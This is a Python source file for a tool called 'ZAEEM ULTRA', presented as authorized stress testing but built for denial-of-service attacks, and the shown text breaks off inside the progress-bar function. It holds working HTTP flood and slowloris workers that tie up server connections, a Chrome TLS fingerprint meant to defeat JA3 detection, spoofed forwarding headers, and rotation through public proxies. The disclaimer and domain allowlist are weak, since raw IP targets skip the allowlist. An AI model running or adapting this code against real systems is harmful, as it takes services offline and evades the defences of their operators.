#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
if sys.version_info < (3, 8):
    print("[!] Python 3.8 or higher is required.")
    sys.exit(1)

import asyncio
import aiohttp
import time
import ssl
import os
import json
import random
import socket
import struct
import threading
import statistics
import string
import re
import ipaddress
from pathlib import Path
from urllib.parse import urlparse, urlencode
from datetime import datetime
from collections import deque

try:
    from aiohttp import ClientSession, TCPConnector, ClientTimeout
except ImportError:
    print("[!] aiohttp not installed.  Run:  pip install aiohttp")
    sys.exit(1)

# -- optional speed / proxy boosters -----------------------------------
try:
    import uvloop
    uvloop.install()
except ImportError:
    uvloop = None

try:
    from aiohttp_socks import ProxyConnector
    SOCKS_OK = True
except ImportError:
    SOCKS_OK = False

# ======================================================================
#  Constants
# ======================================================================
VERSION    = "6.0"
TOOL_NAME  = "ZAEEM ULTRA"
CONTACT    = "@ZAEEM_S1"
TRIAL_DAYS = 9999
PROXY_TTL  = 3600
GITHUB_PROXY_URL = "https://github.com/ywizsuxu-lgtm/sdkmodvip1/raw/refs/heads/main/proxies.txt"
PROXY_FILE        = Path.home() / ".zaeem_proxies.json"
CUSTOM_PROXY_FILE = Path.home() / ".zaeem_custom_proxies.txt"
ALLOWED_FILE      = Path.home() / ".zaeem_allowed.txt"
STATE_FILE        = Path.home() / ".zaeem_state"
RESULTS_DIR       = Path.home() / ".zaeem_results"

DEFAULT_CONC       = 400
DEFAULT_TOTAL      = 5000
DEFAULT_TOUT       = 6.0
WARN_MS            = 600
DEG_5XX            = 0.10
DEG_P95_MS         = 1200
PROXY_TEST_TOUT    = 5.0
PROXY_PARALLEL     = 80
HEALTH_PROBE_COUNT = 3     # number of different checks for smart health

# ======================================================================
#  Attack modes
# ======================================================================
MODE_STRESS    = "STRESS"
MODE_FLOOD     = "FLOOD"
MODE_SLOW      = "SLOWLORIS"
MODE_MIXED     = "MIXED"
MODES          = [MODE_STRESS, MODE_FLOOD, MODE_MIXED, MODE_SLOW]

# ======================================================================
#  Chrome 120 TLS fingerprint
#  Cipher list mirrors Chrome 120 ClientHello order to defeat JA3 checks.
# ======================================================================
CHROME_CIPHERS = ":".join([
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDH+AESGCM",
    "ECDH+CHACHA20",
    "DHE+AESGCM",
    "DHE+CHACHA20",
    "ECDH+AES256",
    "DHE+AES256",
    "ECDH+AES128",
    "DHE+AES128",
])

def make_ssl_context(verify=False):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = verify
    ctx.verify_mode    = ssl.CERT_REQUIRED if verify else ssl.CERT_NONE
    # ALPN: tell server we support h2 and http/1.1 (Chrome behaviour)
    try:
        ctx.set_alpn_protocols(["h2", "http/1.1"])
    except Exception:
        pass
    # Match Chrome cipher order
    try:
        ctx.set_ciphers(CHROME_CIPHERS)
    except ssl.SSLError:
        pass
    # Disable SSLv2/3; allow TLS 1.2+
    ctx.options |= ssl.OP_NO_SSLv2 if hasattr(ssl, "OP_NO_SSLv2") else 0
    ctx.options |= ssl.OP_NO_SSLv3 if hasattr(ssl, "OP_NO_SSLv3") else 0
    ctx.options |= ssl.OP_NO_TLSv1  if hasattr(ssl, "OP_NO_TLSv1")  else 0
    ctx.options |= ssl.OP_NO_TLSv1_1 if hasattr(ssl, "OP_NO_TLSv1_1") else 0
    return ctx

# ======================================================================
#  User-Agent Pool
# ======================================================================
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "okhttp/4.12.0",
    "Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UD1A.231105.004)",
    "Dalvik/2.1.0 (Linux; U; Android 13; SM-S918B Build/TP1A.220624.014)",
    "python-requests/2.31.0",
    "python-requests/2.28.2",
    "Go-http-client/1.1",
    "Go-http-client/2.0",
    "curl/8.4.0",
    "curl/7.88.1",
    "Apache-HttpClient/4.5.14 (Java/17.0.9)",
    "Java/17.0.9",
    "PostmanRuntime/7.37.0",
    "insomnia/9.2.0",
    "axios/1.6.7",
    "node-fetch/2.7.0",
    "aiohttp/3.9.3",
    "GuzzleHttp/7.8.1",
    "libwww-perl/6.72",
    "Wget/1.21.4",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://search.yahoo.com/search?p=",
    "https://duckduckgo.com/?q=",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://t.co/",
    "https://www.reddit.com/",
    "https://www.instagram.com/",
    "https://www.linkedin.com/",
]

# ======================================================================
#  Public proxy sources (fallback when no custom proxies)
# ======================================================================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/http/global/http_checked.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
]

# ======================================================================
#  Colors
# ======================================================================
class Color:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    PURPLE = "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    DIM    = "\033[90m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def paint(text, *codes):
    return "".join(codes) + str(text) + Color.RESET

def div(char="=", width=72, color=Color.CYAN):
    return paint(char * width, color)

def clr():
    os.system("cls" if os.name == "nt" else "clear")

def ts():
    return datetime.now().strftime("%H:%M:%S")

# ======================================================================
#  Banner
# ======================================================================
BANNER = (
    paint(r"""
 ______  ______  ______  ______  __    __
/\___  \/\  __ \/\  ___\/\  ___\/\ "-./  \
\/_/  /_\ \  __ \ \  __\\ \  __\\ \ \-./\ \
  /\_____\ \_\ \_\ \_____\ \_____\ \_\ \ \_\
  \/_____/\/_/\/_/\/_____/\/_____/\/_/  \/_/
""", Color.RED)
    + paint(f"\n   ULTRA STRESS TOOLKIT {VERSION}  |  {CONTACT}\n",
            Color.YELLOW, Color.BOLD)
)

DISCLAIMER = (
    "\n"
    "  This tool is for AUTHORIZED performance testing only.\n"
    "  Use ONLY on systems you own or have explicit written permission to test.\n"
    f"  Contact: {CONTACT}\n"
    "\n"
    "  Type  I AGREE  to continue.\n"
)

# ======================================================================
#  Trial
# ======================================================================
def _load_trial():
    try:
        raw = STATE_FILE.read_text("utf-8").strip()
        return int(raw) if raw.isdigit() else None
    except Exception:
        return None

def _save_trial(t):
    try:
        STATE_FILE.write_text(str(int(t)), "utf-8")
    except Exception:
        pass

def enforce_trial():
    now_ = int(time.time())
    start = _load_trial()
    if start is None:
        _save_trial(now_)
        start = now_
    if (now_ - start) > TRIAL_DAYS * 9999:
        clr()
        print(BANNER)
        print(div())
        print(paint("  TRIAL EXPIRED.", Color.RED, Color.BOLD))
        print(paint(f"  Contact: {CONTACT}", Color.YELLOW))
        print(div())
        sys.exit(1)

# ======================================================================
#  Allowlist
# ======================================================================
def load_allowed():
    try:
        return {
            ln.strip().lower()
            for ln in ALLOWED_FILE.read_text("utf-8").splitlines()
            if ln.strip() and not ln.startswith("#")
        }
    except Exception:
        return set()

def save_allowed(hosts):
    try:
        ALLOWED_FILE.write_text("\n".join(sorted(hosts)), "utf-8")
    except Exception:
        pass

def add_allowed(raw):
    raw = re.sub(r"^https?://", "", raw.strip().lower()).strip("/").split("/")[0].split(":")[0]
    if not raw or " " in raw or len(raw) < 3:
        return False
    h = load_allowed()
    h.add(raw)
    save_allowed(h)
    return True

def is_ip(s):
    try:
        ipaddress.ip_address(s.split(":")[0])
        return True
    except ValueError:
        return False

def normalize_url(raw):
    raw = raw.strip()
    if raw and not re.match(r"^https?://", raw, re.I):
        raw = "http://" + raw
    return raw.rstrip("/")

def resolve_ip(url):
    try:
        host = urlparse(url).hostname or ""
        return socket.gethostbyname(host) if host else "n/a"
    except Exception:
        return "n/a"

def validate_target(url):
    u = urlparse(url)
    if u.scheme not in ("http", "https"):
        return False, "URL must start with http:// or https://"
    host = (u.hostname or "").lower()
    if not host:
        return False, "Invalid host."
    if is_ip(host):
        return True, ""
    allowed = load_allowed()
    if not allowed:
        return False, "No authorized domains. Add one from menu [A]."
    bare = host.lstrip("www.")
    for a in allowed:
        if host == a or host.endswith("." + a) or bare == a:
            return True, ""
    return False, f"'{host}' not in allowlist.\nAllowed: {', '.join(sorted(allowed))}"

# ======================================================================
#  Proxy Engine
#  Supports:
#    - Custom file (~/.zaeem_custom_proxies.txt): preferred, not blacklisted
#    - SOCKS5/SOCKS4/HTTP from custom file
#    - Public sources as fallback
#    - Pre-validation against real target
#    - Proxy scoring by latency
#    - Instant bad-proxy eviction
# ======================================================================
class ProxyEngine:

    def __init__(self):
        self._raw: list     = []   # ip:port strings
        self._scored: list  = []   # [(score_ms, "http://ip:port"), ...] sorted asc
        self._bad: set      = set()
        self._idx: int      = 0
        self._lock          = threading.Lock()
        self.fetched_at     = 0.0
        self.validated      = False
        self.custom_count   = 0

    # ---- parse a proxy line into a URL --------------------------------
    @staticmethod
    def _parse_line(line: str) -> str | None:
        line = line.strip()
        if not line or line.startswith("#"):
            return None
        # Already has scheme
        if re.match(r"^(socks[45]|http)://", line, re.I):
            parts = line.split("//", 1)
            addr  = parts[1].split("/")[0]
            if ":" in addr.split("@")[-1]:
                return line.rstrip("/")
            return None
        # Plain ip:port
        m = re.match(r"^([\d\.]+):(\d+)$", line)
        if m:
            return f"http://{line}"
        return None

    # ---- load custom proxy file ---------------------------------------
    def load_custom(self, cb=None):
        import urllib.request
        if cb:
            cb(paint(f"  [{ts()}] Fetching custom proxies from GitHub...", Color.YELLOW))
        try:
            req = urllib.request.Request(
                GITHUB_PROXY_URL, 
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            with urllib.request.urlopen(req, timeout=10) as response:
                content = response.read().decode('utf-8', errors='ignore')
                lines = content.splitlines()
        except Exception as e:
            if cb:
                cb(paint(f"  [!] Failed to fetch from GitHub: {type(e).__name__}", Color.RED))
            return 0

        parsed = []
        for ln in lines:
            p = self._parse_line(ln)
            if p:
                parsed.append(p)
        parsed = list(dict.fromkeys(parsed))
        
        with self._lock:
            self.custom_count = len(parsed)
            self._raw = [re.sub(r"^[a-z0-9+]+://", "", p) for p in parsed]
            self._scored = [(0.0, p) for p in parsed]
            self._bad = set()
            self._idx = 0
            self.validated = False
            
        if cb:
            cb(paint(f"  [{ts()}] Custom GitHub proxies loaded: {len(parsed)}", Color.GREEN))
        return len(parsed)


    # ---- fetch public sources -----------------------------------------
    @staticmethod
    async def _fetch_one(session, url):
        found = []
        try:
            async with session.get(url, timeout=ClientTimeout(total=12)) as r:
                if r.status == 200:
                    for line in (await r.text(errors="ignore")).splitlines():
                        line = re.sub(r"^https?://", "", line.strip()).strip("/")
                        parts = line.split(":")
                        if len(parts) == 2:
                            try:
                                int(parts[1])
                                found.append(line)
                            except ValueError:
                                pass
        except Exception:
            pass
        return found

    async def _fetch_all(self):
        raw = set()
        conn = TCPConnector(limit=50, ssl=False)
        try:
            async with ClientSession(connector=conn) as s:
                results = await asyncio.gather(
                    *[self._fetch_one(s, u) for u in PROXY_SOURCES],
                    return_exceptions=True,
                )
                for r in results:
                    if isinstance(r, list):
                        raw.update(r)
        except Exception:
            pass
        finally:
            try:
                if not conn.closed:
                    await conn.close()
            except Exception:
                pass
        lst = list(raw)
        random.shuffle(lst)
        return lst

    # ---- validate + score a proxy -------------------------------------
    @staticmethod
    async def _test_one(sem, proxy_url, test_url, timeout, results, idx):
        async with sem:
            t0 = time.perf_counter()
            try:
                # Use http connector only (no SOCKS in validation loop for speed)
                conn = TCPConnector(ssl=False, limit=2)
                to   = ClientTimeout(total=timeout)
                async with ClientSession(connector=conn) as s:
                    async with s.get(test_url, proxy=proxy_url, timeout=to,
                                     allow_redirects=False) as r:
                        if r.status < 600:
                            ms = (time.perf_counter() - t0) * 1000.0
                            results[idx] = ms
                            return
            except Exception:
                pass
            results[idx] = None

    async def _validate_batch(self, proxies, test_url, max_ok):
        results = [None] * len(proxies)
        sem     = asyncio.Semaphore(PROXY_PARALLEL)
        done    = {"n": 0, "ok": 0}
        lock    = asyncio.Lock()

        async def run(proxy_url, idx):
            await self._test_one(sem, proxy_url, test_url, PROXY_TEST_TOUT, results, idx)
            async with lock:
                done["n"] += 1
                if results[idx] is not None:
                    done["ok"] += 1
            sys.stdout.write(
                paint(f"\r  Validating...  working={done['ok']}  tested={done['n']}/{len(proxies)}  ",
                      Color.DIM)
            )
            sys.stdout.flush()

        await asyncio.gather(*[run(p, i) for i, p in enumerate(proxies)],
                             return_exceptions=True)
        print()

        scored = []
        for i, p in enumerate(proxies):
            if results[i] is not None and done["ok"] > 0:
                scored.append((results[i], p))

        scored.sort(key=lambda x: x[0])       # sort by latency ascending (best first)
        return scored[:max_ok]

    def _run(self, coro):
        try:
            return asyncio.run(coro)
        except RuntimeError:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            return loop.run_until_complete(coro)

    # ---- public API ---------------------------------------------------
    def fetch_public(self, cb=None):
        if cb:
            cb(paint(f"  [{ts()}] Fetching from {len(PROXY_SOURCES)} public sources...", Color.YELLOW))
        lst = self._run(self._fetch_all())
        with self._lock:
            self._raw       = lst
            self._scored    = [(0.0, f"http://{p}") for p in lst]
            self._bad       = set()
            self._idx       = 0
            self.fetched_at = time.time()
            self.validated  = False
        self._persist()
        if cb:
            cb(paint(f"  [{ts()}] Fetched {len(lst)} public proxies.", Color.YELLOW))
            cb(paint("  NOTE: Public proxies may be blacklisted by WAFs.",
                     Color.YELLOW))
            cb(paint("  TIP:  Add your own proxies to ~/.zaeem_custom_proxies.txt",
                     Color.CYAN))
        return len(lst)

    def reset_and_fetch(self, cb=None):
        # Prefer custom file; fall back to public sources
        custom = self.load_custom(cb)
        if custom == 0:
            self.fetch_public(cb)

    def validate(self, test_url, cb=None, max_ok=400):
        if cb:
            cb(paint(f"  [{ts()}] Validating proxies against {test_url} ...", Color.YELLOW))
        with self._lock:
            proxies = [url for _, url in self._scored]
        scored = self._run(self._validate_batch(proxies, test_url, max_ok))
        with self._lock:
            self._scored   = scored
            self._bad      = set()
            self._idx      = 0
            self.validated = True
        self._persist()
        if cb:
            cb(paint(f"  [{ts()}] Validation done: {len(scored)} working proxies.", Color.GREEN))
        return len(scored)

    def load_or_init(self, cb=None):
        # Try cache first
        if PROXY_FILE.exists():
            try:
                data = json.loads(PROXY_FILE.read_text("utf-8"))
                age  = time.time() - float(data.get("fetched_at", 0))
                if age < PROXY_TTL and data.get("scored"):
                    with self._lock:
                        self._scored    = [tuple(x) for x in data["scored"]]
                        self._raw       = data.get("raw", [])
                        self.fetched_at = data["fetched_at"]
                        self.validated  = data.get("validated", False)
                        self.custom_count = data.get("custom_count", 0)
                    if cb:
                        cb(paint(f"  [{ts()}] Loaded {len(self._scored)} proxies from cache.", Color.GREEN))
                    return
            except Exception:
                pass
        self.reset_and_fetch(cb)

    def _persist(self):
        try:
            PROXY_FILE.write_text(json.dumps({
                "fetched_at"   : self.fetched_at,
                "raw"          : self._raw[:2000],
                "scored"       : list(self._scored[:2000]),
                "validated"    : self.validated,
                "custom_count" : self.custom_count,
            }), "utf-8")
        except Exception:
            pass

    def next(self) -> str | None:
        with self._lock:
            avail = [(ms, url) for ms, url in self._scored
                     if re.sub(r"^[a-z0-9+]+://", "", url) not in self._bad]
            if not avail:
                return None
            # Use best-scored proxies more often (weighted random)
            top = avail[:max(1, len(avail) // 3)]
            _, url = random.choice(top)
            return url

    def mark_bad(self, proxy_url: str):
        with self._lock:
            raw = re.sub(r"^[a-z0-9+]+://", "", proxy_url)
            self._bad.add(raw)
            self._scored = [(ms, u) for ms, u in self._scored
                            if re.sub(r"^[a-z0-9+]+://", "", u) != raw]

    def count(self) -> int:
        with self._lock:
            avail = [(ms, url) for ms, url in self._scored
                     if re.sub(r"^[a-z0-9+]+://", "", url) not in self._bad]
            return len(avail)

    def raw_count(self) -> int:
        with self._lock:
            return len(self._raw)

    def summary(self) -> str:
        with self._lock:
            total = len(self._scored) + len(self._bad)
            good  = len([u for _, u in self._scored
                         if re.sub(r"^[a-z0-9+]+://", "", u) not in self._bad])
            src   = "custom" if self.custom_count > 0 else "public"
            val   = " validated" if self.validated else ""
            return f"Proxies: {good} active ({src}{val}) / {total} total"


PROXY = ProxyEngine()

# ======================================================================
#  Bandwidth estimator
# ======================================================================
async def estimate_upload_mbps(url: str, ssl_ctx) -> float:
    host   = urlparse(url).hostname or ""
    port   = urlparse(url).port or (443 if urlparse(url).scheme == "https" else 80)
    chunk  = b"X" * 65536    # 64 KB test chunk
    t0     = time.perf_counter()
    sent   = 0
    limit  = 2.0             # run for 2 seconds max
    try:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(host, port, ssl=ssl_ctx),
            timeout=5.0,
        )
        while time.perf_counter() - t0 < limit:
            w.write(chunk)
            await w.drain()
            sent += len(chunk)
        try:
            w.close()
        except Exception:
            pass
    except Exception:
        pass
    elapsed = max(0.001, time.perf_counter() - t0)
    return (sent / elapsed) / 1_000_000

def suggest_mode_for_bandwidth(mbps: float) -> str:
    if mbps < 1.0:
        return MODE_SLOW
    if mbps < 5.0:
        return MODE_FLOOD
    return MODE_MIXED

# ======================================================================
#  Payload helpers
# ======================================================================
def rand_str(n=12):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))

def rand_qs():
    k = random.randint(2, 6)
    return "?" + "&".join(
        f"{rand_str(random.randint(4,8))}={rand_str(random.randint(6,16))}"
        for _ in range(k)
    )

def rand_post():
    return urlencode({rand_str(8): rand_str(16)
                      for _ in range(random.randint(4, 10))})

def rand_xff():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def rand_referer(target_url):
    base = random.choice(REFERERS)
    kw   = (urlparse(target_url).hostname or rand_str(8)).replace(".", "+")
    return base + kw

def rand_cookie():
    keys = ["session", "token", "uid", "sid", "auth", "csrf", "track", "_ga", "_fbp"]
    return "; ".join(f"{k}={rand_str(16)}" for k in random.sample(keys, random.randint(2, 4)))

def build_headers(target_url, method):
    """Construct headers that closely mimic a real Chrome 120 browser request."""
    h = {
        "User-Agent"               : random.choice(UA_POOL),
        "Accept"                   : random.choice([
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "application/json, text/plain, */*",
        ]),
        "Accept-Language"          : random.choice([
            "en-US,en;q=0.9",
            "en-GB,en;q=0.8,en-US;q=0.6",
            "en-US,en;q=0.5",
        ]),
        "Accept-Encoding"          : "gzip, deflate, br",
        "Connection"               : "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control"            : random.choice(["no-cache", "max-age=0"]),
        "Pragma"                   : "no-cache",
        "Sec-Fetch-Dest"           : random.choice(["document", "empty", "image"]),
        "Sec-Fetch-Mode"           : random.choice(["navigate", "cors", "no-cors"]),
        "Sec-Fetch-Site"           : random.choice(["none", "same-origin", "cross-site"]),
        "Sec-Fetch-User"           : "?1",
        "sec-ch-ua"                : '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec-ch-ua-mobile"         : "?0",
        "sec-ch-ua-platform"       : random.choice(['"Windows"', '"Linux"', '"macOS"']),
        "X-Forwarded-For"          : rand_xff(),
        "X-Real-IP"                : rand_xff(),
        "X-Originating-IP"         : rand_xff(),
        "Referer"                  : rand_referer(target_url),
        "Cookie"                   : rand_cookie(),
    }
    if method == "POST":
        h["Content-Type"] = random.choice([
            "application/x-www-form-urlencoded",
            "application/json",
        ])
    if random.random() < 0.25:
        h["DNT"] = "1"
    return h

# ======================================================================
#  Stats
# ======================================================================
class Stats:
    def __init__(self, total):
        self.total     = total
        self.ok        = 0
        self.fail      = 0
        self.retried   = 0
        self.lat       = deque(maxlen=10000)
        self.codes     = {}
        self.errors    = {}
        self._lock     = threading.Lock()
        self.t0        = time.perf_counter()

    def hit(self, ms, code):
        with self._lock:
            self.ok += 1
            self.lat.append(ms)
            self.codes[code] = self.codes.get(code, 0) + 1

    def miss(self, name):
        with self._lock:
            self.fail += 1
            self.errors[name] = self.errors.get(name, 0) + 1

    def add_retry(self):
        with self._lock:
            self.retried += 1

    def sent(self):
        return self.ok + self.fail

    def rps(self):
        e = time.perf_counter() - self.t0
        return self.sent() / e if e > 0 else 0.0

    def pct(self, p):
        lat = sorted(self.lat)
        if not lat:
            return 0.0
        k = max(0, int(round((p / 100) * (len(lat) - 1))))
        return lat[k]

    def avg(self):
        lat = list(self.lat)
        return statistics.mean(lat) if lat else 0.0

# ======================================================================
#  STRESS worker
# ======================================================================
async def worker_stress(session, url, method, sem, stats, timeout,
                        use_proxy, rand_path, verbose, max_retries=1,
                        ssl_ctx=None):
    async with sem:
        target = url + (rand_qs() if rand_path else "")
        data   = rand_post() if method == "POST" else None
        proxy  = PROXY.next() if use_proxy else None

        for attempt in range(max_retries + 1):
            if attempt > 0:
                stats.add_retry()
                proxy = None   # fallback direct on retry

            t0 = time.perf_counter()
            try:
                async with session.request(
                    method, target,
                    headers=build_headers(url, method),
                    data=data, proxy=proxy,
                    timeout=timeout,
                    allow_redirects=True, max_redirects=5,
                    ssl=ssl_ctx,
                ) as resp:
                    await resp.read()
                    ms = (time.perf_counter() - t0) * 1000.0
                    stats.hit(ms, resp.status)
                    if verbose:
                        col = (Color.RED if resp.status >= 500 else
                               Color.YELLOW if (resp.status >= 400 or ms >= WARN_MS)
                               else Color.GREEN)
                        print(paint(f"  [{ts()}] {resp.status}  {ms:7.1f}ms", col))
                    return

            except asyncio.TimeoutError:
                if attempt < max_retries:
                    continue
                stats.miss("TimeoutError")
                return

            except (aiohttp.ClientProxyConnectionError,
                    aiohttp.ClientHttpProxyError,
                    aiohttp.ClientConnectorError) as e:
                if proxy:
                    PROXY.mark_bad(proxy)
                if attempt < max_retries:
                    proxy = None
                    continue
                stats.miss("ProxyError" if proxy else "ConnectError")
                return

            except aiohttp.ServerDisconnectedError:
                stats.hit(0.0, 503)
                return

            except Exception as e:
                stats.miss(type(e).__name__)
                return

# ======================================================================
#  FLOOD worker  (send request headers, abandon without reading)
#  Exhausts the server's TCP connection backlog + worker slots.
# ======================================================================
async def worker_flood(url, method, sem, stats, tout_connect,
                       use_proxy, rand_path, verbose, ssl_ctx):
    async with sem:
        target = url + (rand_qs() if rand_path else "")
        parsed = urlparse(target)
        host   = parsed.hostname or ""
        port   = parsed.port or (443 if parsed.scheme == "https" else 80)
        path   = (parsed.path or "/") + ("?" + parsed.query if parsed.query else "")
        proxy  = PROXY.next() if use_proxy else None

        t0 = time.perf_counter()
        try:
            if proxy and not SOCKS_OK:
                proxy = None   # aiohttp-socks not available, skip proxy in raw mode

            if proxy and proxy.startswith("socks"):
                proxy = None   # raw TCP doesn't support SOCKS natively

            r, w = await asyncio.wait_for(
                asyncio.open_connection(
                    host, port,
                    ssl=ssl_ctx if parsed.scheme == "https" else None,
                ),
                timeout=tout_connect,
            )
            hdrs = build_headers(url, method)
            req  = (
                f"{method} {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                + "".join(f"{k}: {v}\r\n" for k, v in hdrs.items())
            )
            if method == "POST":
                body    = rand_post()
                content = f"Content-Length: {len(body) + 1000}\r\n\r\n"
                w.write((req + content).encode("utf-8", errors="replace"))
                # Send only beginning of body (server waits for rest = worker slot occupied)
                w.write(body[:random.randint(4, 32)].encode("utf-8", errors="replace"))
            else:
                w.write((req + "\r\n").encode("utf-8", errors="replace"))

            await w.drain()
            ms = (time.perf_counter() - t0) * 1000.0
            stats.hit(ms, 200)
            try:
                w.close()
            except Exception:
                pass
            if verbose:
                print(paint(f"  [{ts()}] FLOOD  ok  {ms:6.1f}ms", Color.CYAN))

        except asyncio.TimeoutError:
            stats.miss("FloodTimeout")
        except ConnectionRefusedError:
            stats.miss("ConnRefused")
        except Exception as e:
            stats.miss(f"Flood:{type(e).__name__}")

# ======================================================================
#  SLOWLORIS worker  (hold connection open with incomplete HTTP headers)
# ======================================================================
async def worker_slow(url, sem, stats, hold_sec, verbose, ssl_ctx):
    async with sem:
        parsed = urlparse(url)
        host   = parsed.hostname or ""
        port   = parsed.port or (443 if parsed.scheme == "https" else 80)

        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(
                    host, port,
                    ssl=ssl_ctx if parsed.scheme == "https" else None,
                ),
                timeout=10.0,
            )
            partial = (
                f"GET /{rand_str(8)}?{rand_str(6)}={rand_str(12)} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {random.choice(UA_POOL)}\r\n"
                f"Accept: text/html,application/xhtml+xml,*/*;q=0.8\r\n"
                f"X-Forwarded-For: {rand_xff()}\r\n"
                f"Accept-Language: en-US,en;q=0.9\r\n"
                # Intentionally no final \r\n — connection stays "waiting" on server
            )
            w.write(partial.encode("utf-8"))
            await w.drain()
            stats.hit(0.0, 200)   # connection established = counted as success

            deadline = time.perf_counter() + hold_sec
            while time.perf_counter() < deadline:
                await asyncio.sleep(random.uniform(4, 9))
                try:
                    # Send another harmless header line to keep socket alive
                    w.write(f"X-{rand_str(8)}: {rand_str(16)}\r\n".encode())
                    await w.drain()
                except Exception:
                    break

            try:
                w.close()
            except Exception:
                pass

            if verbose:
                print(paint(f"  [{ts()}] SLOWLORIS held {hold_sec}s", Color.PURPLE))

        except asyncio.TimeoutError:
            stats.miss("SlowTimeout")
        except ConnectionRefusedError:
            stats.miss("ConnRefused")
        except Exception as e:
            stats.miss(f"Slow:{type(e).__name__}")

# ======================================================================
#  Progress bar
# ======================================================================
async def show_progress(tasks, stats, mode):
    W = 32
    while True:
        done   = sum(1 for t in tasks if t.done())
        frac   = done / stats.total if stats.total else 1.0
        filled = int(frac * W)
        bar    = "#" * filled + "-" * (W - filled)
        line   = (
            paint(f"\r  [{ts()}] ", Color.DIM)
            + paint(f"[{mode}]", Color.PURPLE)
            + " "
            + paint(f"[{bar}]", Color.CYAN)
            + paint(f" {done}/{stats.total}", Color.WHITE)
            + paint(f"  rps={stats.rps():6.1f}", Color.GREEN)
            + paint(f"  avg={stats.avg():5.0f}ms", Color.YELLOW)
